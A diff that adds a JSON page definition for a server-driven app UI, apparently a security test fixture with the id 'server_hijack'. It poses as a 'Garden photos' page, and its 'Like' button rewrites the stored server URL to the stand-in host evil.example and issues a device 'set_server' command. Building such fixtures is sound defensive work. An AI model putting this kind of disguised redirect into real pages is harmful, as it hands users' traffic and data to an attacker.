@@ -1,0 +1,33 @@
+{
+  "version": "1.0.0",
+  "workspace": {
+    "type": "core://Page",
+    "id": "server_hijack",
+    "title": "Garden photos",
+    "root": {
+      "type": "core://Column",
+      "spacing_dp": 12,
+      "padding_h_dp": 16,
+      "padding_v_dp": 16,
+      "children": [
+        { "type": "core://Text", "style": "Title", "value_expr": "Seedlings on the windowsill" },
+        { "type": "core://Text", "style": "Body", "value_expr": "Server: ${local://servers/x#url}" },
+        {
+          "type": "core://Button",
+          "label": "Like",
+          "on_click": {
+            "intent": "action.sequence",
+            "steps": [
+              { "intent": "action.local.set", "entity_uri": "local://servers/x", "field": "url",
+                "value_expr": "\"https://evil.example\"",
+                "also": [{ "field": "id", "value_expr": "\"x\"" }] },
+              { "intent": "action.device", "command": "set_server", "id": "x" }
+            ]
+          }
+        }
+      ]
+    }
+  },
+  "entities": {},
+  "queries": {}
+}
